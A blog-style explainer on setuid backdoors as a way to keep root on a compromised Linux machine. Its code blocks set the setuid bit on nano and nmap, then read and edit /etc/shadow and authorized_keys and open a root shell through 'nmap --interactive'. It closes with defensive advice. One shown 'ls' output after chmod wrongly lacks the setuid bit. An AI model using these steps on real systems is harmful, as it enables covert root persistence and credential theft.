# Why You Can't Un-Root a Compromised Machine

Let's say somebody temporarily got root access to your system, whether because you "temporarily" gave them sudo rights, they guessed your password, or any other way. Even if you can disable their original method of accessing root, there's an infinite number of dirty tricks they can use to easily get it back in the future.

While the obvious tricks are easy to spot, like adding an entry to /root/.ssh/authorized_keys, or creating a new user, potentially via running malware, or via a cron job. I recently came across a rather subtle one that doesn't require changing any code, but instead exploits a standard feature of Linux user permissions system called [setuid ](http://en.wikipedia.org/wiki/Setuid) to subtly allow them to execute a root shell from any user account from the system (including `www-data`, which you might not even know if compromised).

If the "setuid bit" (or flag, or permission mode) is set for executable, the operating system will run not as the current user, but as the owner. If that executable was installed globally, (as in `sudo apt-get install vim`), its owner will likely be `root`, and any user running `vim` it will be effectively running `sudo vim`, but without the sudo authorization.

For example, here's how a "hacker" with temporary root access can add the "setuid bit" to `nano`, a built-in text editor:

```
ssh root@target

whoami                 #    root
ls -al /bin/nano       #    -rwxr-xr-x 1 root root 191976 2010-02-01 20:30 /bin/nano

chmod u+s /bin/nano    # installs the backdoor

ls -al /bin/nano       #    -rwxr-xr-x 1 root root 191976 2010-02-01 20:30 /bin/nano
```

With this `nano` backdoor in place, the hacker will be able to regain root-level access even after you lock him out, if he can log in as any (non-privileged) user on the system:

```
ssh random-user@target

cat /etc/shadow                      #    cat: /etc/shadow: Permission denied
nano /etc/shadow                     #    SUCCESS - can set all passwords
nano /root/.ssh/authorized_keys      #    SUCCESS - can set authorized public keys (and read private keys)
```

The exploit can be made even more elegant if the target system has `nmap` installed. It's a common network diagnostic tool (like `ping` or `traceroute`, but with an added bonus: `nmap --interactive` allows you to easily execute shell commands By setting `nmap`'s setuid bit, we can easily make it a root shell:

```
# simulate hacker with root access
ssh root@localhost 'chmod u+s /usr/bin/nmap'

ssh anyuser@target
whoami                   # anyuser
cat /etc/shadow          # /etc/shadow: Permission denied
nmap --interactive
> !whoami              # root
> !cat /etc/shadow     # SUCCESS: prints out hashed passwords
> !bash                # SUCCESS: launches root shell
```

What's particularly sneaky here is that 'nmap' (like its little brother 'ping') needs root privileges to carry out most of its tests. In fact, `ls -al /bin/ping` shows that it already has the "setuid bit" set, which is why we don't have to run `sudo ping` all the time. But because nmap makes it easy to execute arbitrary commands through it, the [nmap manpage](http://manpages.ubuntu.com/manpages/precise/en/man1/nmap.1.html#contenttoc15) warns against using it with setuid. But many sysadmins don't read manpages, and will not notice this important security hole.

See [here](http://joshrendek.com/2013/02/why-setuid-is-bad-and-what-you-can-do/) for more info about setuid and nmap.

The moral of this whole story should be clear:
* Once your system has been hacked (especially rooted), you can't trust it anymore. You need to figure out how it was originally exploited, then restore from a known clean backup, and plug the hole. Or better yet, you're using an SCM tool like chef or puppet and can easily redeploy from scratch.
* In general, never allow shell access to untrusted parties, since you probably don't understand the holes in Linux user permissions well enough, and it can easily come back to bite you.
